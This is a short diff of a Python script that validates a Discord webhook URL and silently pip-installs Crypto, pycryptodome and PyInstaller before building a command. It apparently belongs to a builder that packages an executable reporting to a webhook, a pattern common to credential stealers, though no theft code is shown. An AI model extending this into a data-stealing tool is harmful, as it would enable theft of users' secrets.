@@ -29,7 +29,7 @@ while True:
             
             re = requests.get(Webhook)
             if re.status_code == 200 and ('discord.com' in Webhook or 'discordapp.com' in Webhook):
-                print('Valid Webhook')
+                print('\033[92mValid Webhook\033[0m')
                 break
             else:
                 print('Invalid Webhook')
@@ -117,7 +117,11 @@ while True:
                 __import__('Crypto')
             except ImportError:
                 subprocess.Popen(f"\"{executable}\" -m pip install 'Crypto' --quiet", shell=True)    
-                subprocess.Popen(f"\"{executable}\" -m pip install 'pycryptodome' --quiet", shell=True)        
+                subprocess.Popen(f"\"{executable}\" -m pip install 'pycryptodome' --quiet", shell=True)     
+            try:
+                __import__('pyinstaller')
+            except ImportError:
+                subprocess.Popen(f"\"{executable}\" -m pip install 'pyinstaller' --quiet", shell=True)       
 
 
             command = [
